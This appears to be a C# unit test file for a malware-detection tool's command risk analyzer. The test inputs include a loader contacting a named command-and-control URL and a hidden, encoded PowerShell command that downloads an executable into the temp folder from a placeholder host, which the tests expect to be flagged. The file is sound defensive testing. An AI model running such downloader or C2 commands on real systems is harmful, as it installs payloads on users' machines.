using LuckyGuard.Core.Detection;
using LuckyGuard.Windows.Analysis;

namespace LuckyGuard.Tests;

public sealed class CommandRiskAnalyzerTests
{
    [Fact]
    public void ConfirmedLuckywareC2_IsCriticalConfirmed()
    {
        var assessment = CommandRiskAnalyzer.Analyze(@"C:\Temp\loader.exe https://luckyware.cy/index.php");
        Assert.NotNull(assessment);
        Assert.Equal(DetectionSeverity.Critical, assessment.Severity);
        Assert.Equal(DetectionConfidence.Confirmed, assessment.Confidence);
    }

    [Fact]
    public void EncodedHiddenDownloader_IsHigh()
    {
        var assessment = CommandRiskAnalyzer.Analyze("powershell -WindowStyle Hidden -EncodedCommand AAAA Invoke-WebRequest https://example.invalid/a -OutFile %TEMP%\\a.exe", true);
        Assert.NotNull(assessment);
        Assert.Equal(DetectionSeverity.High, assessment.Severity);
    }

    [Fact]
    public void NormalAppDataApplication_IsNotFlagged()
    {
        var assessment = CommandRiskAnalyzer.Analyze(@"C:\Users\Alice\AppData\Local\Programs\Discord\Discord.exe --processStart Discord.exe", true);
        Assert.Null(assessment);
    }

    [Fact]
    public void TimestampExecutableInTemp_IsSuspicious()
    {
        var assessment = CommandRiskAnalyzer.Analyze(@"C:\Users\Alice\AppData\Local\Temp\BK1723456789012.exe", true);
        Assert.NotNull(assessment);
        Assert.Equal(DetectionSeverity.Suspicious, assessment.Severity);
    }
}
